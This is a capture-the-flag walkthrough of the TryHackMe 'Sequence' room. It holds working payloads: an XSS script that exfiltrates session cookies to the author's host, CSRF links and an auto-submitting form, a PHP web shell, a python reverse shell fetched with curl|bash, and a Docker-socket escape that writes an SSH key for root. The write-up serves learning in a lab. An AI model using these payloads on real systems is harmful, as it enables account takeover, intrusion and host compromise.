---
title: "TryHackMe: Sequence"
author: jaxafed
categories: [TryHackMe]
tags: [linux, web, php, xss, stored xss, javascript, csrf, insecure file upload, rce, docker, container escape, privilege escalation]
render_with_liquid: false
media_subpath: /images/tryhackme_sequence/
image:
  path: room_image.webp
---

**Sequence** started with exploiting a **Cross-Site Scripting (XSS)** vulnerability on a contact form to capture session cookies, gaining access as a moderator user. Afterwards, using the chat functionality, we were able to send links which the admin user visited. Leveraging this, combined with either a **Cross-Site Request Forgery (CSRF)** vulnerability to update our user's role or the previously discovered **stored XSS** vulnerability, we were able to escalate privileges to the admin user. This granted us access to an internal web application. Exploiting an **insecure file upload** vulnerability in this internal application allowed us to gain a shell inside a **Docker** container. Finally, by utilizing the **Docker socket** mounted inside the container, we were able to escape the container and complete the room.

[![Tryhackme Room Link](room_card.webp){: width="300" height="300" .shadow}](https://tryhackme.com/room/sequence){: .center }

## Initial Enumeration

### Nmap Scan

```console
$ nmap -T4 -n -sC -sV -Pn -p- 10.10.177.42
Nmap scan report for 10.10.177.42
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 ee:b3:ad:7d:fa:d6:86:99:08:69:51:9f:86:56:d1:1b (RSA)
|   256 1a:9e:3b:7c:eb:88:d1:42:50:cf:6a:2d:08:c6:c2:0c (ECDSA)
|_  256 b0:44:30:d3:ca:4f:36:54:88:d2:5d:71:4f:89:94:3d (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Review Shop
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

There are two open ports:

* **22** (`SSH`)
* **80** (`HTTP`)

We are also provided with the `review.thm` hostname in the room, so we add it to our `hosts` file:

```
10.10.177.42 review.thm
```
{: file="/etc/hosts" }

### Web 80

Visiting `http://review.thm/`, there is not much; we only see two buttons:

![Web 80 Index](web_80_index.webp){: width="1200" height="600"}

* **`Login`** which links to `http://review.thm/login.php`, showing a login form:

![Web 80 Login](web_80_login.webp){: width="1200" height="600"}

* **`Contact Us`** which links to `http://review.thm/contact.php`, showing a contact form:

![Web 80 Contact](web_80_contact.webp){: width="1200" height="600"}

Fuzzing the web application reveals a few endpoints, with **`/mail/`** standing out:

```console
$ ffuf -u 'http://review.thm/FUZZ' -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -mc all -t 100 -fc 404 -e .php -ic
...
mail                    [Status: 301, Size: 307, Words: 20, Lines: 10, Duration: 85ms]
...
```
{: .wrap }

Visiting `http://review.thm/mail/` shows that directory indexing is enabled and that it contains a single file, `dump.txt`.

![Web 80 Mail](web_80_mail.webp){: width="1200" height="600"}

Fetching `http://review.thm/mail/dump.txt` reveals some email addresses, the **`/finance.php`** and **`/lottery.php`** endpoints on an internal web application, and a password **`S60u}f5j`**:

```console
$ curl -s 'http://review.thm/mail/dump.txt'
From: software@review.thm
To: product@review.thm
Subject: Update on Code and Feature Deployment

Hi Team,

I have successfully updated the code. The Lottery and Finance panels have also been created.

Both features have been placed in a controlled environment to prevent unauthorized access. The Finance panel (`/finance.php`) is hosted on the internal 192.x network, and the Lottery panel (`/lottery.php`) resides on the same segment.

For now, access is protected with a completed 8-character alphanumeric password (S60u}f5j), in order to restrict exposure and safeguard details regarding our potential investors.

I will be away on holiday but will be back soon.

Regards,
Robert
```

## Access as mod

Testing this password against the login form at `/login.php` was not successful, and there does not seem to be anything else interesting. Since we cannot log in, let's switch our attention to the contact form.

### XSS

Testing the form, upon submitting it, we get the message: `Thank you for your feedback! Someone from our team will review it shortly.`

![Web 80 Contact2](web_80_contact2.webp){: width="1200" height="600"}

Since our message seems to be reviewed, we can simply test the form for an XSS vulnerability with the payload `<script src="http://10.14.101.76/test.js"></script>` that tries to include a JavaScript file from our server in the message field:

![Web 80 Contact3](web_80_contact3.webp){: width="1200" height="600"}

After submitting the form, this works, as we receive a request for the `test.js` file on our server:

```console
$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.177.42 - - [19/Sep/2025 21:46:07] code 404, message File not found
10.10.177.42 - - [19/Sep/2025 21:46:07] "GET /test.js HTTP/1.1" 404 -
```

With this we are able to include a script and execute JavaScript in the victim's session. To leverage this, we can either look back at the `nmap` scan and notice the `httponly flag not set` message or simply check how the application sets our cookie. We see that the `HttpOnly` flag for the cookie is indeed not set, which allows us to access the cookies using JavaScript and exfiltrate them.

![Web 80 Cookie](web_80_cookie.webp){: width="1000" height="500"}

We can create the `test.js` file on our web server with the following content to exfiltrate cookies:

```js
fetch("http://10.14.101.76/?c="+document.cookie)
```
{: file="test.js" }

After creating `test.js`, we see the request returning `200`, and the next request sends the victim's cookies:

```console
10.10.177.42 - - [19/Sep/2025 21:49:49] "GET /test.js HTTP/1.1" 200 -
10.10.177.42 - - [19/Sep/2025 21:49:49] "GET /?c=PHPSESSID=k73b004qihakut11s5lv4s32lc HTTP/1.1" 200 -
```

Now we go back to the web application and change our cookie to the one we captured.

![Web 80 Cookie2](web_80_cookie2.webp){: width="1200" height="600"}

Refreshing the page to access the website with the new cookie, we can see that we are successfully able to log in as the `mod` user and capture the first flag in the header.

![Web 80 Dashboard Mod](web_80_dashboard_mod.webp){: width="1200" height="600"}

## Access as admin

As a moderator, we get access to a couple more pages:

* `http://review.thm/admin_view.php` where we can see the messages we submitted on the contact form along with our XSS payload.

![Web 80 Admin View](web_80_admin_view.webp){: width="1200" height="600"}

* `http://review.thm/settings.php` where we can either change our password or promote a user to the admin role.

![Web 80 Settings](web_80_settings.webp){: width="1200" height="600"}

* Testing the password reset functionality we see it is via a POST request to the `/update_password.php` endpoint with a `multipart/form-data` content type. While the reset functionality does not require knowledge of the old password, we see it requires a CSRF token.

![Web 80 Update Password](web_80_update_password.webp){: width="1000" height="500"}

* Trying to update our own role to admin, we see it is performed via a **GET** request to `/promote_coadmin.php` with the `username` parameter and, once again, a CSRF token named `csrf_token_promote` and this action is restricted to admin users.

![Web 80 Promote Coadmin](web_80_promote_coadmin.webp){: width="1000" height="500"}

> One interesting thing to note is that the CSRF token for both forms is not only the same, but no matter how many times we refresh the page, we always get the same token. This indicates the token is **static** and not randomly generated.
{: .prompt-info }

- `http://review.thm/chat.php` where we can send the admin user messages.

![Web 80 Chat](web_80_chat.webp){: width="1200" height="600"}

If we try to send the admin user an XSS payload same as before, we see that the chat seems to be filtered against XSS payloads as we get a `Malicious Input Detected` warning. Even trying other payloads that bypass this filter, the messages seem to be properly sanitized.

![Web 80 Chat Xss](web_80_chat_xss.webp){: width="1200" height="600"}

However, instead of an XSS payload, if we send a simple link like `http://10.14.101.76/admin_test`, we can see the admin user visits this link as we get a hit on our web server:

![Web 80 Chat Link](web_80_chat_link.webp){: width="1200" height="600"}

```console
10.10.177.42 - - [19/Sep/2025 22:26:58] code 404, message File not found
10.10.177.42 - - [19/Sep/2025 22:26:58] "GET /admin_test HTTP/1.1" 404 -
```

Since we know the admin user will visit whatever link we send, this gives us multiple paths we can try to utilize to compromise the admin account. I will share all of them.

### Path #1: Stored XSS

First of all, since the admin visits any link we send, we can go back to the same method that allowed us to compromise the `mod` user. We know our messages with the XSS payload are displayed at the `/admin_view.php` endpoint. So if we make the admin user visit this endpoint by simply sending a link to `http://review.thm/admin_view.php`, we could use the same vulnerability and payload to also capture the cookies for the admin user:

![Web 80 Chat Xss2](web_80_chat_xss2.webp){: width="1200" height="600"}

We can see this works as expected and, apart from the `mod` user's session cookie, we are also able to capture the `admin` user's cookie.

```console
10.10.177.42 - - [19/Sep/2025 22:38:11] "GET /test.js HTTP/1.1" 200 -
10.10.177.42 - - [19/Sep/2025 22:38:11] "GET /?c=PHPSESSID=04ta32qg3654h5lf36mqne46j9 HTTP/1.1" 200 -
```

Now, the same way as before, changing our cookie to the one we captured from the admin user and refreshing the page, we are able to log in as the admin user and capture the second flag.

![Web 80 Admin](web_80_admin.webp){: width="1200" height="600"}

### Path #2: CSRF to Update Role

Another way we could exploit the fact that the admin user visits any link we send would be to use a CSRF vulnerability. In our case, the form to change the password or the one to update our role would be the best candidates for it. However, going back to them, we remember both of them also included a CSRF token to prevent us from doing exactly this.

But we also noticed that the CSRF token was not randomly generated and seemed to be static. Examining it more closely, it looks like an MD5 hash: `ad148a3ca8bd0ef3b48c52454c493ec5`. Using [crackstation.net](https://crackstation.net/) to try to crack it, we can see that it cracks to `mod`, which is the username for our user.

![Crackstation Mod Hash](crackstation_mod_hash.webp){: width="1050" height="400"}

Knowing this, we can also calculate the CSRF token for the admin user as `21232f297a57a5a743894a0e4a801fc3`.

```console
$ echo -n 'mod' | md5sum
ad148a3ca8bd0ef3b48c52454c493ec5  -

$ echo -n 'admin' | md5sum
21232f297a57a5a743894a0e4a801fc3  -
```

With the knowledge of the CSRF token for the `admin` user, we can simply send the admin a link to:
```
http://review.thm/promote_coadmin.php?username=mod&csrf_token_promote=21232f297a57a5a743894a0e4a801fc3
```
to try to update our role to admin.

![Web 80 Chat Csrf Update Role](web_80_chat_csrf_update_role.webp){: width="1200" height="600"}

Now the admin should visit the `/promote_coadmin.php` endpoint and our role should be updated. We can test this by first changing the password for the `mod` user and **re-logging in** with the new password to update our session.

We can see this worked as our role is updated to admin and we are able to once again capture the second flag.

![Web 80 Admin2](web_80_admin2.webp){: width="1200" height="600"}

### Path #3: CSRF to Change Password

Now that we know how the CSRF token is generated and what it will be for the admin user, we were able to exploit the role promotion functionality to escalate to the admin user. But what about the password reset functionality?

Well, while this attack is technically possible, **`it is not actually very feasible`**. However, I still wanted to share it and explain why.

Going back to how our cookie was set, we can see that, just like the `HttpOnly` attribute not being set, the `SameSite` attribute is also not set. In some browsers, this would not be a problem for us because they default an unspecified `SameSite` to `None`. However, on `Chrome` (which the bot uses in our case), when the `SameSite` attribute is not specified on a cookie, it defaults to `Lax`. This means that for a **top-level cross-site POST request** like the one we need to force the admin user to make to change the password, **the cookie will not be sent**, which makes this method not very feasible.

However, this decision by Google to default to `Lax` broke many sites, especially the likes of legacy SSO applications. To fix this, Chrome makes a special allowance: **the cookie can be sent with top-level cross-site POST requests**, but **only if the cookie was set less than 2 minutes ago**. **After 2 minutes, the full `Lax` restriction kicks in, and the cookie is blocked for such requests.** And this is what actually makes the attack technically possible, but only within a very narrow time window.

In our case, when we start the target machine, the bot also starts automatically and one of the first things it does is visit the site, which causes its cookies to be set. From that point, our 2-minute timer starts. **If we want to exploit this method and change the password, we have to be very quick from the moment we start the machine and ensure we force the admin user to make the password change request within those two minutes. Afterwards, any password change request we force the admin to make will not include the cookie and will fail**, which makes this method impractical.

Going back to the how, we first create a CSRF payload on our web server as `update_password.html` that will automatically submit a form to the `http://review.thm/update_password.php` endpoint to update the password with the correct CSRF token for admin when visited.

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>CSRF Attack - Password Change</title>
    <script type="text/javascript">
        window.onload = function() {
           document.forms["csrfForm"].submit();
        }
    </script>
</head>
<body>
    <h1>Loading...</h1>
    <p>Please wait while we process your request...</p>
    <form id="csrfForm" action="http://review.thm/update_password.php" method="POST" enctype="multipart/form-data">
        <input type="hidden" name="new_password" value="123456789">
        <input type="hidden" name="csrf_token" value="21232f297a57a5a743894a0e4a801fc3">
        <input type="submit" value="Submit"/>
    </form>
</body>
</html>
```
{: file="update_password.html" }

Now we can send the link for it as `http://10.14.101.76/update_password.html` to the admin user:

![Web 80 Chat Csrf Password Change](web_80_chat_csrf_password_change.webp){: width="1200" height="600"}

We can see the admin user visiting our payload and the password for the admin user should be changed.

```console
10.10.115.72 - - [20/Sep/2025 17:40:23] "GET /update_password.html HTTP/1.1" 200 -
```

Trying to log in with the new credentials, we are successful and able to capture the second flag.

![Web 80 Admin3](web_80_admin3.webp){: width="1200" height="600"}

## Shell as root

### Shell Inside Container

Whichever path we choose, we now have access to the application as admin and, on `http://review.thm/dashboard.php`, we can see the **Select Feature** option with one option: **Lottery Feature** and choosing it simply gives a **Coming Soon** message.

![Web 80 Admin Feature](web_80_admin_feature.webp){: width="1200" height="600"}

Checking the request in Burp Suite, we can see it makes a POST request to `/dashboard.php` with the feature set to `lottery.php`.

![Web 80 Admin Dashboard Feature Request](web_80_admin_dashboard_feature_request.webp){: width="500" height="500"}

With the feature being `lottery.php`, and remembering the note we found in `/mail/dump.txt`, it seems this gives us access to the internal web application mentioned. From the note, apart from the `/lottery.php` endpoint, there was also a `/finance.php` endpoint. We can intercept the request in Burp Suite, change `lottery.php` to `finance.php`, and forward it to try to access that endpoint.

![Web 80 Admin Dashboard Finance](web_80_admin_dashboard_finance.webp){: width="1350" height="550"}

Doing so, we can now see `finance.php` being loaded and it asks for a password.

![Web 80 Admin Dashboard Finance2](web_80_admin_dashboard_finance2.webp){: width="1200" height="600"}

Using the password we discovered in `/mail/dump.txt`, we get a form for uploading files.

![Web 80 Admin Dashboard Finance3](web_80_admin_dashboard_finance3.webp){: width="1200" height="600"}

Since it is also a PHP application, we can try to upload a PHP web shell. First, we create the web shell:

```php
<?php system($_GET["cmd"]); ?>
```
{: file="shell.php" }

After uploading it, we can see that it is successfully written to `uploads/shell.php`.

![Web 80 Admin Dashboard Finance4](web_80_admin_dashboard_finance4.webp){: width="1200" height="600"}

Now, once again using the `/dashboard.php` endpoint, we can try to access the web shell and execute commands by changing `lottery.php` to `uploads/shell.php?cmd=id`. We can see this works as expected and we are able to execute commands.

![Web 80 Dashboard Rce](web_80_dashboard_rce.webp){: width="1000" height="500"}

We can use this web shell to get a proper shell. First, we create our reverse shell payload and serve it on our web server:

```console
$ cat index.html
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.14.101.76",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...       
```
{: .wrap }

Now, with the payload `uploads/shell.php?cmd=curl+10.14.101.76|bash`, we can see the server hangs.

![Web 80 Dashboard Rce2](web_80_dashboard_rce2.webp){: width="1000" height="500"}

On our listener, we have a shell as **root** inside a Docker container.

```console
$ nc -lvnp 443
listening on [any] 443 ...
connect to [10.14.101.76] from (UNKNOWN) [10.10.177.42] 37372
# python3 -c 'import pty;pty.spawn("/bin/bash");'
root@4f18a45cca05:/var/www/html/uploads# export TERM=xterm
root@4f18a45cca05:/var/www/html/uploads# ^Z
zsh: suspended  nc -lvnp 443

$ stty raw -echo; fg
[1]  + continued  nc -lvnp 443

root@4f18a45cca05:/var/www/html/uploads# id
uid=0(root) gid=0(root) groups=0(root)
```

### Escaping the Container

Either manually or using an automated tool to enumerate the container, we can notice that the Docker socket is mounted inside the container, which allows us to interact with the Docker daemon.

```console
root@4f18a45cca05:/var/www/html/uploads# ls -la /var/run/docker.sock
srw-rw---- 1 root 121 0 Sep 19 20:31 /var/run/docker.sock
```

Luckily for us, `docker` is installed inside the container, and we can use it to interact with the Docker daemon via the socket.

```console
root@4f18a45cca05:/var/www/html/uploads# docker --version
Docker version 20.10.24+dfsg1, build 297e128
```

Being able to interact with the Docker daemon allows us to do many things. In our case, we can use it to escape the container by creating another container with the host's filesystem mounted. First, we list all available images to use for creating a container:

```console
root@4f18a45cca05:/var/www/html/uploads# docker image ls
REPOSITORY      TAG       IMAGE ID       CREATED        SIZE
phpvulnerable   latest    d0bf58293d3b   3 months ago   926MB
php             8.1-cli   0ead645a9bc2   6 months ago   527MB
```

We can choose any available image and create a container with the host's filesystem mounted using `-v /:/mnt` and get a shell inside this new container. Inside, we can access the host's filesystem at `/mnt` and read the flag at `/mnt/root/flag.txt` to complete the room.

```console
root@4f18a45cca05:/var/www/html/uploads# docker run -v /:/mnt --rm -it php:8.1-cli bash
root@20a77d926fa2:/# wc -c /mnt/root/flag.txt
20 /mnt/root/flag.txt
```

If we also want to get a direct shell on the host, one of the easiest methods would be to add an **SSH public key** for the `root` user by writing it to `/mnt/root/.ssh/authorized_keys`.

```console
$ ssh-keygen -f id_ed25519 -t ed25519

$ cat id_ed25519.pub
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEv0dxpGzpFzrQ6Ovsky6/pnI5m1EcqcE+tiuYFfuIL/ kali@kali

root@20a77d926fa2:/mnt/var/www/html# echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEv0dxpGzpFzrQ6Ovsky6/pnI5m1EcqcE+tiuYFfuIL/ kali@kali' > /mnt/root/.ssh/authorized_keys

$ ssh -i id_ed25519 root@review.thm
root@sequence:~# id
uid=0(root) gid=0(root) groups=0(root)
```
{: .wrap }

> Finally, I want to add that, in this case, the container with the **Docker socket** mounted had the **Docker CLI** installed, which made exploitation straightforward. However, if this were not the case, we could either upload a static Docker binary to the container or better yet use **`curl`** to perform the same steps with commands like `curl -s --unix-socket /var/run/docker.sock http://localhost/images/json`, if you want to give it a try.
{: .prompt-tip }

<style>
.center img {
  display:block;
  margin-left:auto;
  margin-right:auto;
}
.wrap pre{
    white-space: pre-wrap;
}
</style>
